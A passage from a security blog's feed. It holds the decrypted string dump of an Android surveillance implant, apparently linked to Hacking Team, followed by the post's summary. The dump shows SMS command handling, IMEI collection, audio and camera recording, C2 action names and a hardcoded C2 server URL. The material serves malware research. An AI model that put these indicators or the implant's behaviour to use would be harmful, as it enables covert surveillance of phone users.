class="line">0x1f9ae : Free space monitor sleep time (mills)</div><div class="line">0x1f9e8 : ZipCompressionMethod</div><div class="line">0x1f9f8 : ZipCompressionMethod</div><div class="line">0x1fa08 : Zip compression method (0, 8 - default: 8)</div><div class="line">0x1fcb8 : sms command executor != NUL?</div><div class="line">0x1fcd6 : executeCommand</div><div class="line">0x1fd1a : Error parsing sms message in inner Thread.</div><div class="line">0x1fd8c : android.provider.Telephony.SMS_RE??NPL</div><div class="line">0x1fe08 : phone</div><div class="line">0x1fe2a : pdus</div><div class="line">0x1fe6c : sms command executor abort broadcast</div><div class="line">0x1feb8 : Error parsing sms message.</div><div class="line">0x1ffea : Error in Activity Monitor</div><div class="line">0x200d4 : Error while disabling data connectivity</div><div class="line">0x202c8 : android.intent.action.??HKRLVP</div><div class="line">0x202de : android.intent.action.SCREEN_OFF</div><div class="line">0x202f2 : android.intent.action.USER_PRESENT</div><div class="line">0x204f4 : *************************** ERROR EVENT:</div><div class="line">0x2052a : ***************************</div><div class="line">0x20542 :</div><div class="line"></div><div class="line"></div><div class="line">0x2055a :</div><div class="line"></div><div class="line"></div><div class="line">0x2057a :</div><div class="line"></div><div class="line"></div><div class="line">0x20592 : *********************************************************************************</div><div class="line">0x205aa : ??</div><div class="line">0x205fc : ***************************</div><div class="line">0x20632 : ***************************</div><div class="line">0x20664 :</div><div class="line"></div><div class="line"></div><div class="line">0x206b8 :</div><div class="line"></div><div class="line"></div><div class="line">0x206ea :</div><div class="line"></div><div class="line"></div><div class="line">0x2071e :</div><div class="line"></div><div class="line"></div><div class="line">0x20750 : Exception Type =</div><div class="line">0x20790 :</div><div class="line"></div><div class="line"></div><div class="line">0x207c2 :</div><div class="line"></div><div class="line"></div><div class="line">0x20874 : *************************** TRACE EVENT:</div><div class="line">0x208aa : ***************************</div><div class="line">0x208c2 :</div><div class="line"></div><div class="line"></div><div class="line">0x208d8 :</div><div class="line"></div><div class="line"></div><div class="line">0x208f6 :</div><div class="line"></div><div class="line"></div><div class="line">0x2090e : *********************************************************************************</div><div class="line">0x20924 :</div><div class="line"></div><div class="line"></div><div class="line">0x209f8 : Log__</div><div class="line">0x20a2e : .txt</div><div class="line">0x20b02 : 9000</div><div class="line">0x20d16 : #####Exception Details:</div><div class="line">0x20d72 :</div><div class="line"></div><div class="line"></div><div class="line">0x20dce :</div><div class="line"></div><div class="line"></div><div class="line">0x20e44 :</div><div class="line"></div><div class="line"></div><div class="line">0x20e76 :</div><div class="line"></div><div class="line"></div><div class="line">0x20f84 : 873451679TRW68IO</div><div class="line">0x20ff0 : phone</div><div class="line">0x21010 : IMEI:</div><div class="line">0x21036 :  MODEL:</div><div class="line">0x210a2 :  Release:</div><div class="line">0x210c6 :  CodeName:</div><div class="line">0x210e8 :  Inc:</div><div class="line">0x2110c :  SDK:</div><div class="line">0x2115e : Error while elaborating sms command</div><div class="line">0x21216 : Aggiornamento effettuato con successo.</div><div class="line">0x21512 : Error executing SupportActivity delegate</div><div class="line">0x21598 : onBeforeBackPressed</div><div class="line">0x215d6 : onAfterBackPressed</div><div class="line">0x21638 : onBeforeCreate</div><div class="line">0x21784 : onAfterCreate</div><div class="line">0x217ec : onBeforeDestroy</div><div class="line">0x2182a : onAfterDestroy</div><div class="line">0x2186a : onKeyDown</div><div class="line">0x21904 : onBeforePause</div><div class="line">0x21942 : onAfterPause</div><div class="line">0x21984 : onBeforeRestart</div><div class="line">0x219c2 : onAfterRestart</div><div class="line">0x21a04 : onBeforeResume</div><div class="line">0x21a42 : onAfterResume</div><div class="line">0x21a84 : onBeforeStart</div><div class="line">0x21ac2 : onAfterStart</div><div class="line">0x21b04 : onBeforeStop</div><div class="line">0x21b42 : onAfterStop</div><div class="line">0x21b80 : surfaceChanged</div><div class="line">0x21c36 : surfaceCreated</div><div class="line">0x21ca0 : surfaceDestroyed</div><div class="line">0x30b58 : 9009</div><div class="line">0x30bfc : 9009||</div><div class="line">0x30cfa : Free space is too low. Preallocated file has been deleted. Actual free space:</div><div class="line">0x30d4a : Free space is low. Actual free space:</div><div class="line">0x30d90 : Error in Free Space Monitor</div><div class="line">0x30e76 : /Android/data/__android.data</div><div class="line">0x31152 : SMS Implementation Found....</div><div class="line">0x31188 : Error loading current SmsCommand implementation.</div><div class="line">0x311a4 : Error creating SmsCommand implementation.</div><div class="line">0x31244 : NotifyAlert</div><div class="line">0x312c0 : NotifyLog</div><div class="line">0x3140e : Error while zipping file:</div><div class="line">0x3153c : Error while zipping.</div><div class="line">0x316fc : Error while Executing ActionExecutorManager.</div><div class="line">0x31ba0 : TLS</div><div class="line">0x31ca0 : Audio recording Error. What:</div><div class="line">0x31cbe :   Extra:</div><div class="line">0x321b0 : Error restarting recorder</div><div class="line">0x32454 : Error while reconnecting to camera</div><div class="line">0x32a84 : Recording Started.</div><div class="line">0x32ae8 : Error while starting record.</div><div class="line">0x32bbe : 0023</div><div class="line">0x32e70 : Error deactivating.</div><div class="line">0x332ac : Error while Executing ActionExecutor.</div><div class="line">0x332ec : Error while Executing action in ActionExecutor.</div><div class="line">0x3352e : RequestActivation</div><div class="line">0x3359e : NotifyClient</div><div class="line">0x335f8 : http://68.233.237.11:8443/lservice/Licenses/</div><div class="line">0x338f0 : Error calculating server base url</div><div class="line">0x33b48 : (.*)Network(.*)unreachable(.*)</div><div class="line">0x33b64 : Error while Executing ActionExectorTransferer.</div><div class="line">0x33b7e : Error while Executing ActionExectorTransferer.</div><div class="line">0x33bfa : SendCurrentActions</div><div class="line">0x33c62 : RequestActionsToExecute</div><div class="line">0x33cd2 : AckRequestedActions</div><div class="line">0x33d3a : SubmitExecutedActions</div><div class="line">0x33f24 : addURL</div><div class="line">0x33f6a : Error, could not add URL to system classloader</div><div class="line">0x34002 : DefaultValue</div><div class="line">0x3401a : ValueType</div><div class="line">0x34046 : Description</div><div class="line">0x3406a : Key</div><div class="line">0x3408e : Value</div><div class="line">0x340a6 : ValueType</div><div class="line">0x340d2 : ValueType</div><div class="line">0x3430a : /Android/data/</div><div class="line">0x34430 : Cannot find a valid storage path.</div><div class="line">0x344a8 : GetActionsPack</div><div class="line">0x3482a : Error while transfering file:</div><div class="line">0x34918 : Error while transfering.</div><div class="line">0x34a48 : input parameter is null, cannot expand to 8 bytes</div><div class="line">0x34a72 : invalid byte length, cannot expand to 8 bytes</div><div class="line">0x34b16 : corrput AES extra data records</div><div class="line">0x34c08 : file header is null in reading Zip64 Extended Info</div><div class="line">0x34c80 : file header is null in reading Zip64 Extended Info</div><div class="line">0x34cfc : invalid file handler when trying to read extra data record</div><div class="line">0x34d2a : file header is null</div><div class="line">0x34d70 : invalid file handler when trying to read extra data record</div><div class="line">0x34da0 : file header is null</div><div class="line">0x34de4 : file header is null in reading Zip64 Extended Info</div><div class="line">0x34ef0 : file header is null in reading Zip64 Extended Info</div><div class="line">0x34fb4 : random access file was null</div><div class="line">0x35116 : Expected central directory entry not found (#</div><div class="line">0x3536a : fileName is null when reading central directory</div><div class="line">0x353dc : file.separator</div><div class="line">0x3541e : file.separator</div><div class="line">0x35516 : EndCentralRecord was null, maybe a corrupt zip file</div><div class="line">0x35576 : random access file was null</div><div class="line">0x355fe : zip headers not found. probably not a zip file</div><div class="line">0x3561c : Probably not a zip file or a corrupted zip file</div><div class="line">0x3587a : IOException when reading short buff</div><div class="line">0x35896 : unexpected end of file when reading short buff</div><div class="line">0x358e4 : invalid file handler when trying to read Zip64EndCentralDirLocator</div><div class="line">0x359f8 : invalid zip64 end of central directory locator</div><div class="line">0x35a30 : invalid offset for start of end of central directory record</div><div class="line">0x35aa6 : invalid signature for zip64 end of central directory record</div><div class="line">0x35f68 : invalid read parameters for local header</div><div class="line">0x35fca : invalid local header offset</div><div class="line">0x36044 : invalid local header signature for file:</div><div class="line">0x361d6 : file name is null, cannot assign file name to local file header</div><div class="line">0x3627a : file.separator</div><div class="line">0x362bc : file.separator</div><div class="line">0x36406 : input byte array list is null, cannot conver to byte array</div><div class="line">0x364a0 : one of the input parameters is null, cannot copy byte array to array list</div><div class="line">0x36506 : file headers are null, cannot calculate number of entries on this disk</div><div class="line">0x36650 : invalid output stream, cannot update compressed size for local file header</div><div class="line">0x36690 : attempting to write a non 8-byte compressed size block for a zip64 file</div><div class="line">0x36742 : input parameters is null, cannot write central directory</div><div class="line">0x36808 : zip model or output stream is null, cannot write end of central directory record</div><div class="line">0x368c6 : invalid central directory/file headers, cannot write end of central directory record</div><div class="line">0x36a2c : input parameters is null, cannot write local file header</div><div class="line">0x36f28 : zip model or output stream is null, cannot write zip64 end of central directory locator</div><div class="line">0x36ffe : zip model or output stream is null, cannot write zip64 end of central directory record</div><div class="line">0x37170 : invalid central directory/file headers, cannot write end of central directory record</div><div class="line">0x37250 : invalid buff to write as zip headers</div><div class="line">0x372d0 : input parameters is null, cannot finalize zip file</div><div class="line">0x37440 : input parameters is null, cannot finalize zip file without validations</div><div class="line">0x37548 : invalid input parameters, cannot update local file header</div><div class="line">0x375bc : file.separator</div><div class="line">0x3760a : .z0</div><div class="line">0x3765e : invalid output stream handler, cannot update local file header</div><div class="line">0x376dc : .z</div><div class="line">0x37770 : input parameters is null, cannot write extended local header</div><div class="line">0x3782c : input parameters are null, cannot write local file header</div><div class="line">0x37bac : one of the input parameters is null in AESDecryptor Constructor</div><div class="line">0x37bfc : HmacSHA1</div><div class="line">0x37c0a : ISO-8859-1</div><div class="line">0x37c80 : invalid file header in init method of AESDecryptor</div><div class="line">0x37cb2 : invalid aes key strength for file:</div><div class="line">0x37d2a : empty or null password provided for AES Decryptor</div><div class="line">0x37d56 : invalid aes extra data record - in init method of AESDecryptor</div><div class="line">0x37d84 : HmacSHA1</div><div class="line">0x37de0 : invalid derived key</div><div class="line">0x37e7e : invalid derived password verifier for AES</div><div class="line">0x37eca : Wrong Password for file:</div><div class="line">0x37f80 : AES not initialized properly</div><div class="line">0x38132 : input password is empty or null in AES encrypter constructor</div><div class="line">0x3817c : Invalid key strength in AES encrypter constructor</div><div class="line">0x381a8 : HmacSHA1</div><div class="line">0x381b6 : ISO-8859-1</div><div class="line">0x38236 : invalid salt size, cannot generate salt</div><div class="line">0x382e2 : invalid aes key strength, cannot determine key sizes</div><div class="line">0x38352 : invalid key generated, cannot decrypt file</div><div class="line">0x383e0 : HmacSHA1</div><div class="line">0x38466 : input bytes are null, cannot perform AES encrpytion</div><div class="line">0x384c0 : AES Encrypter is in finished state (A non 16 byte block has already been passed to encrypter)</div><div class="line">0x38c74 : UTF-8</div><div class="line">0x38ef4 : one of the input parameters were null in standard decrpyt data</div><div class="line">0x39008 : Invalid CRC in File Header</div><div class="line">0x39054 : Wrong password!</div><div class="line">0x390fc : input password is null or empty in standard encrpyter constructor</div><div class="line">0x3915a : input password is null or empty, cannot initialize standard encrypter</div><div class="line">0x391c4 : invalid header bytes generated, cannot perform standard encryption</div><div class="line">0x3928c : invalid length specified to decrpyt data</div><div class="line">0x392fc : size is either 0 or less than 0, cannot generate header for standard encryptor</div><div class="line">0x3b5ce : invalid key length (not 128/192/256)</div><div class="line">0x3bae0 : AES engine not initialised</div><div class="line">0x3bb0c : output buffer too short</div><div class="line">0x3bb4e : input buffer too short</div><div class="line">0x3c0c0 : fileNameInZip is null or empty</div><div class="line">0x3c170 : fileName is null or empty. unable to create file header</div><div class="line">0x3c2de : UTF8</div><div class="line">0x3c424 : invalid aes key strength, cannot determine key sizes</div><div class="line">0x3c4d8 : file header is null, cannot create local file header</div><div class="line">0x3c6c4 : zip parameters are null, cannot generate AES Extra Data record</div><div class="line">0x3c724 : AE</div><div class="line">0x3c75c : invalid ??RZ;bzp[zcknwh-c57jzg1fo)p|e&lt;]x|7HZ?Lc]e8+]nmj9</div><div class="line">0x3c7de : input file is null, cannot get file attributes</div><div class="line">0x3c8b6 : invalid encprytion method</div><div class="line">0x3cc70 : invalid encrypter for AES encrypted file</div><div class="line">0x3cd9c : input file does not exist</div><div class="line">0x3cf7e : file name is empty for external stream</div><div class="line">0x3d45e : invalid compression level for deflater. compression level should be in the range of 0-9</div><div class="line">0x3d62a : Error occured while reading stored AES authentication bytes</div><div class="line">0x3daa6 : Unexpected end of ZLIB input stream</div><div class="line">0x3dbc6 : input buffer is null</div><div class="line">0x3dc1a : input buffer is null</div><div class="line">0x3dc52 : Invalid ZLIB data format</div><div class="line">0x3dcc0 :  - Wrong Password?</div><div class="line">0x3ddbe : negative skip length</div><div class="line">0x3de68 : split length less than minimum allowed split length of 65536 Bytes</div><div class="line">0x3de84 : rw</div><div class="line">0x3e002 : file.separator</div><div class="line">0x3e028 : .z0</div><div class="line">0x3e07a : split file:</div><div class="line">0x3e0a0 :  already exists in the current directory, cannot rename this file</div><div class="line">0x3e100 : file.separator</div><div class="line">0x3e128 : .z</div><div class="line">0x3e176 : cannot rename newly created split file</div><div class="line">0x3e1a4 : rw</div><div class="line">0x3e200 : negative buffersize for checkBuffSizeAndStartNextSplitFile</div><div class="line">0x3e312 : negative buffersize for isBuffSizeFitFor</div><div class="line">0x3e470 : split length less than minimum allowed split length of 65536 Bytes</div><div class="line">0x3f13c : input zipModel is null</div><div class="line">0x3f168 : Invalid output path</div><div class="line">0x3f186 : invalid file header</div><div class="line">0x411a2 : \\</div><div class="line">0x4175e : ZipModel is null</div><div class="line">0x417f0 : fileHeaders is null, cannot calculate total work</div><div class="line">0x41898 : Cannot check output directory structure...one of the parameters was null</div><div class="line">0x419c4 : fileHeader is null</div><div class="line">0x41b66 : invalid central directory in zipModel</div><div class="line">0x41ba8 : Zip4j</div><div class="line">0x41bf0 : fileHeader is null</div><div class="line">0x41c48 : Zip4j</div><div class="line">0x41cf8 : Invalid parameters passed to StoreUnzip. One or more of the parameters were null</div><div class="line">0x41d40 : unable to determine salt length: AESExtraDataRecord is null</div><div class="line">0x41d7c : unable to determine salt length: invalid aes key strength</div><div class="line">0x41e2a : error reading local file header. Is this a valid zip file?</div><div class="line">0x41faa : invalid first part split file signature</div><div class="line">0x41ffa : .z0</div><div class="line">0x42058 : .z</div><div class="line">0x420f4 :  - Wrong Password?</div><div class="line">0x421bc : input parameter is null in getFilePointer</div><div class="line">0x4231a : file.separator</div><div class="line">0x4237c : invalid output path</div><div class="line">0x42484 : local file header is null, cannot initialize input stream</div><div class="line">0x424e0 : local file header is null, cannot init decrypter</div><div class="line">0x42572 : unsupported encryption method</div><div class="line">0x42612 : CRC (MAC) check failed for</div><div class="line">0x4267c : invalid CRC for file:</div><div class="line">0x426e0 :  - Wrong Password?</div><div class="line">0x42726 : invalid CRC (MAC) for file:</div><div class="line">0x427b8 : file header is null, cannot get inputstream</div><div class="line">0x4281e : local header and file header do not match</div><div class="line">0x42930 : compression type not supported</div><div class="line">0x42950 : invalid decryptor when trying to calculate compressed size for AES encrypted file:</div><div class="line">0x429c4 : AESExtraDataRecord does not exist for AES encrypted file:</div><div class="line">0x42ae2 : zip split file does not exist:</div><div class="line">0x42b56 : .z</div><div class="line">0x42bae : .z0</div><div class="line">0x42c36 : Invalid parameters passed during unzipping file. One or more of the parameters were null</div><div class="line">0x42dfc : cannot set file properties: file header is null</div><div class="line">0x42ebe : cannot set file properties: file doesnot exist</div><div class="line">0x42ede : cannot set file properties: output file is null</div><div class="line">0x42f18 : invalid file header. cannot set file attributes</div><div class="line">0x43214 : .z0</div><div class="line">0x432ec : input or output stream is null, cannot copy file</div><div class="line">0x4338e : start offset is greater than end offset, cannot copy file</div><div class="line">0x433da : end offset is negative, cannot copy file</div><div class="line">0x43428 : starting offset is negative, cannot copy file</div><div class="line">0x434a8 : input parameter is null in getFilePointer, cannot create file handler to remove file</div><div class="line">0x43518 : zip model is null, cannot create split file handler</div><div class="line">0x4358e : split file does not exist:</div><div class="line">0x435f2 : .z0</div><div class="line">0x43650 : .z</div><div class="line">0x436d4 : one of the input parameters is null, cannot merge split zip file</div><div class="line">0x43840 : corrupt zip model, archive not a split zip file</div><div class="line">0x4390e : archive not a split zip file</div><div class="line">0x43a48 : outFile is null, cannot create outputstream</div><div class="line">0x43ace : cannot rename modified zip file</div><div class="line">0x43aee : cannot delete old zip file</div><div class="line">0x43b30 : zip model is null - cannot update end of central directory for split zip model</div><div class="line">0x43bca : corrupt zip model - getCentralDirectory, cannot update split zip model</div><div class="line">0x43c2a : corrupt zip model - getCentralDirectory, cannot update split zip model</div><div class="line">0x43d7e : zip model is null, cannot update split Zip64 end of central directory locator</div><div class="line">0x43e32 : zip model is null, cannot update split Zip64 end of central directory record</div><div class="line">0x43f04 : zip model is null, cannot update split zip model</div><div class="line">0x43f64 : zip model is null, cannot calculate total work for merge op</div><div class="line">0x43fe0 : one of the input parameters is null, cannot calculate total work</div><div class="line">0x44058 : input parameters is null in maintain zip file, cannot remove file from archive</div><div class="line">0x44076 : cannot close input stream or output stream when trying to delete a file from zip file</div><div class="line">0x44094 : cannot close input stream or output stream when trying to delete a file from zip file</div><div class="line">0x440b2 : cannot close input stream or output stream when trying to delete a file from zip file</div><div class="line">0x441a8 : file header not found in zip model, cannot remove file</div><div class="line">0x441e6 : This is a split archive. Zip file format does not allow updating split/spanned files</div><div class="line">0x442e2 : invalid offset for start and end of local file, cannot remove file</div><div class="line">0x44456 : invalid local file header, cannot remove file from archive</div><div class="line">0x445ee : offsetCentralDir</div><div class="line">0x44924 : Zip4j</div><div class="line">0x44982 : Zip4j</div><div class="line">0x449e8 : comment is null, cannot update Zip file with comment</div><div class="line">0x44a08 : zipModel is null, cannot update Zip file with comment</div><div class="line">0x44a30 : windows-1254</div><div class="line">0x44a50 : windows-1254</div><div class="line">0x44a68 : windows-1254</div><div class="line">0x44a7e : windows-1254</div><div class="line">0x44aae : comment length exceeds maximum length</div><div class="line">0x44c84 : input file is null or empty, cannot calculate CRC for the file</div><div class="line">0x44ca2 : error while closing the file after calculating crc</div><div class="line">0x44d60 : error while closing the file after calculating crc</div><div class="line">0x44da4 : error while closing the file after calculating crc</div><div class="line">0x44e44 : file.encoding</div><div class="line">0x44e60 : file.separator</div><div class="line">0x44ec6 : bit array is null, cannot calculate byte from bits</div><div class="line">0x44f16 : invalid bit array length, cannot calculate byte</div><div class="line">0x44f42 : invalid bits provided, bits contain other values than 0 or 1</div><div class="line">0x45510 : input arraylist is null, cannot check types</div><div class="line">0x455c8 : cannot check if file exists: input file is null</div><div class="line">0x45620 : path is null</div><div class="line">0x45684 : path is null</div><div class="line">0x456a2 : cannot read zip file</div><div class="line">0x456ce : file does not exist:</div><div class="line">0x45740 : path is null</div><div class="line">0x4576c : file does not exist:</div><div class="line">0x457a0 : cannot read zip file</div><div class="line">0x45800 : output path is null</div><div class="line">0x45844 : output folder is not valid</div><div class="line">0x4586a : no write access to output folder</div><div class="line">0x45898 : output folder is not valid</div><div class="line">0x458b6 : Cannot create destination folder</div><div class="line">0x458de : no write access to destination folder</div><div class="line">0x4592c : Cp850</div><div class="line">0x45948 : Cp850</div><div class="line">0x45962 : UTF8</div><div class="line">0x4597e : UTF8</div><div class="line">0x459e4 : UTF8</div><div class="line">0x45a3c : input string is null, cannot detect charset</div><div class="line">0x45a54 : Cp850</div><div class="line">0x45a70 : Cp850</div><div class="line">0x45a92 : Cp850</div><div class="line">0x45aa4 : UTF8</div><div class="line">0x45ac0 : ??[_</div><div class="line">0x45ae2 : UTF8</div><div class="line">0x45bd8 : filePath is null or empty, cannot get absolute file path</div><div class="line">0x45ce8 : Cp850</div><div class="line">0x45d40 : input string is null, cannot calculate encoded String length</div><div class="line">0x45da0 : input string is null, cannot calculate encoded String length</div><div class="line">0x45dd6 : encoding is not defined, cannot calculate string length</div><div class="line">0x45e0a : Cp850</div><div class="line">0x45e26 : Cp850</div><div class="line">0x45e48 : UTF8</div><div class="line">0x45e64 : UTF8</div><div class="line">0x45ec4 : zip model is null, cannot determine file header for fileName:</div><div class="line">0x45efe : \\</div><div class="line">0x45f2a : \?</div><div class="line">0x45f60 : file name is null, cannot determine file header for fileName:</div><div class="line">0x45fae : zip model is null, cannot determine file header with exact match for fileName:</div><div class="line">0x45ffe : file Headers are null, cannot determine file header with exact match for fileName:</div><div class="line">0x46082 : central directory is null, cannot determine file header with exact match for fileName:</div><div class="line">0x460c4 : file name is null, cannot determine file header with exact match for fileName:</div><div class="line">0x46154 : input file is null, cannot calculate file length</div><div class="line">0x461c0 : invalid file name</div><div class="line">0x4621e : input file is null, cannot get file name</div><div class="line">0x46278 : input path is null, cannot read files in the directory</div><div class="line">0x46336 : input parameters is null, cannot determine index of file header</div><div class="line">0x46382 : central directory is null, ccannot determine index of file header</div><div class="line">0x46408 : file Headers are null, cannot determine index of file header</div><div class="line">0x46436 : file name in file header is empty or null, cannot determine index of file header</div><div class="line">0x46468 : input file is null, cannot read last modified file time</div><div class="line">0x46498 : input file does not exist, cannot read last modified file time</div><div class="line">0x464ec : input file path/name is empty, cannot calculate relative file name</div><div class="line">0x46524 : \\</div><div class="line">0x465a8 : Error determining file name</div><div class="line">0x46624 : file.separator</div><div class="line">0x46668 : \\</div><div class="line">0x46738 : cannot get split zip files: zipmodel is null</div><div class="line">0x467fe : cannot get split zip files: zipfile is null</div><div class="line">0x46814 : .z0</div><div class="line">0x4682c : .z</div><div class="line">0x468b8 : zip file name is empty or null, cannot determine zip file name</div><div class="line">0x468d6 : file.separator</div><div class="line">0x468fa : file.separator</div><div class="line">0x469c4 : charset is null or empty, cannot check if it is supported</div><div class="line">0x46a2e : os.name</div><div class="line">0x46a4e : win</div><div class="line">0x46b54 : input file is null. cannot set archive file attribute</div><div class="line">0x46b90 : attrib +A &quot;</div><div class="line">0x46bde : attrib +A &quot;</div><div class="line">0x46c5c : input file is null. cannot set hidden file attribute</div><div class="line">0x46c8c : attrib +H &quot;</div><div class="line">0x46d08 : input file is null. cannot set read only file attribute</div><div class="line">0x46d4c : input file is null. cannot set archive file attribute</div><div class="line">0x46d7c : attrib +S &quot;</div><div class="line">0x46e62 : zip model is null in ZipEngine constructor</div><div class="line">0x46ec8 : file list is null, cannot calculate total work</div><div class="line">0x4705c : cannot validate zip parameters</div><div class="line">0x470a4 : invalid compression level. compression level dor deflate should be in the range of 0-9</div><div class="line">0x470da : input password is empty or null</div><div class="line">0x4711e : unsupported encryption method</div><div class="line">0x47152 : unsupported compression type</div><div class="line">0x47210 : one of the input parameters is null when adding files</div><div class="line">0x47328 : invalid end of central directory record</div><div class="line">0x47362 : no files to add</div><div class="line">0x475d0 : invalid output path</div><div class="line">0x47626 : rw</div><div class="line">0x47760 : offsetCentralDir</div><div class="line">0x4777c : offsetCentralDir</div><div class="line">0x477f0 : NumberFormatException while parsing offset central directory. Cannot update already existing file header</div><div class="line">0x4781c : Error while parsing offset central directory. Cannot update already existing file header</div><div class="line">0x4790a : one of the input parameters is null when adding files</div><div class="line">0x47954 : Zip4j</div><div class="line">0x4798a : no files to add</div><div class="line">0x479c0 : one of the input parameters is null, cannot add folder to zip</div><div class="line">0x47a50 : input folder does not exist</div><div class="line">0x47abc : input file is not a folder, user addFileToZip method to add files</div><div class="line">0x47af8 : cannot read folder:</div><div class="line">0x47b56 : one of the input parameters is null, cannot add stream to zip</div><div class="line">0x47c08 : invalid end of central directory record</div><div class="line">997 strings decrypted</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; class=&quot;headerlink&quot; title=&quot;Table of Contents&quot;&gt;&lt;/a&gt;Table of Contents&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#Soapbox-Prelude&quot;&gt;Soapbox Prelude&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#The-Story&quot;&gt;The Story&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Analysis&quot;&gt;Analysis&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#APK-Content&quot;&gt;APK Content&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Signer-Certificate&quot;&gt;Signing Certificate&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Android-Manifest&quot;&gt;Android Manifest&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#String-Encryption&quot;&gt;String Encryption&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Decrypting-the-Strings&quot;&gt;Decrypting the Strings&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Features-Overview&quot;&gt;Features Overview&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#Data-Exfiltration&quot;&gt;Data Exfiltration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Is-it-HackingTeam&quot;&gt;Is it HackingTeam?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Appendix&quot;&gt;Appendix&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#Yara-Rule&quot;&gt;Yara Rule&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Samples&quot;&gt;Samples&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Captured-C2-Interactions&quot;&gt;Captured C2 Interactions&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#RequestActionsToExecute-Request&quot;&gt;RequestActionsToExecute - Request&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#RequestActionsToExecute-Response&quot;&gt;RequestActionsToExecute - Response&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#AckRequestedActions-Request&quot;&gt;AckRequestedActions - Request&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#AckRequestedActions-Response&quot;&gt;AckRequestedActions - Response&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#UploadService-Request&quot;&gt;UploadService - Request (data exfiltration)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#UploadService-Response&quot;&gt;UploadService - Response&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#NotifyLog-Request&quot;&gt;NotifyLog - Request&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#NotifyLog-Response&quot;&gt;NotifyLog - Response&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#Decrypted-String-Dump&quot;&gt;Decrypted String Dump&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Soapbox-Prelude&quot;&gt;&lt;a href=&quot;#Soapbox-Prelude&quot; class=&quot;headerlink&quot; title=&quot;Soapbox Prelude&quot;&gt;&lt;/a&gt;&lt;a name=&quot;Soapbox-Prelude&quot;&gt;&lt;/a&gt;Soapbox Prelude&lt;/h2&gt;&lt;p&gt;The past few years have been interesting in terms of surveillance and nation state purchased malware. Gamma Team (FinFisher) got owned, followed by Hacking Team having all the source code for their implants being posted on &lt;a href=&quot;https://github.com/HackedTeam&quot;&gt;GitHub&lt;/a&gt;. Just this year, Hacking Team &lt;a href=&quot;https://www.privacyinternational.org/node/826&quot;&gt;lost their global license to sell spyware&lt;/a&gt;. I’m unsure how this really would affect their business. The linked article explains the situation better than I ever could. To quote the article, it means:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hacking Team will have to apply for an individual [export] license for each country. It will then be up to the Italian authorities to approve or deny any requests.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Maybe someone can shed light on what this actually means? Does that mean that a license must be acquired for the country in which the implant is being deployed or does it mean the license must exist for the country which the buying entity exists? Regardless, it would seem that recently the Hacking Team &lt;a href=&quot;http://www.ilfattoquotidiano.it/2016/11/02/hacking-team-motivazione-inadeguata-il-consiglio-di-stato-contraddice-il-mise-sulla-revoca-dellautorizzazione-allexport/3163585/&quot;&gt;has had their global license reinstated&lt;/a&gt;. So, in theory none of this matters… Or does it?&lt;br&gt;
    
    </summary>
    
    
      <category term="research" scheme="https://rednaga.io/tags/research/"/>
    
      <category term="android" scheme="https://rednaga.io/tags/android/"/>
    
      <category term="reverse engineering" scheme="https://rednaga.io/tags/reverse-engineering/"/>
    
      <category term="ida pro" scheme="https://rednaga.io/tags/ida-pro/"/>
    
      <category term="hackingteam" scheme="https://rednaga.io/tags/hackingteam/"/>
    
      <category term="surveillance" scheme="https://rednaga.io/tags/surveillance/"/>
    
  </entry>
  
  <entry>
    <title>Reversing GO binaries like a pro</title>
    <link href="https://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro/"/>
    <id>https://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro/</id>
    <published>2016-09-21T07:00:00.000Z</published>
    <updated>2017-10-29T00:35:14.000Z</updated>
    
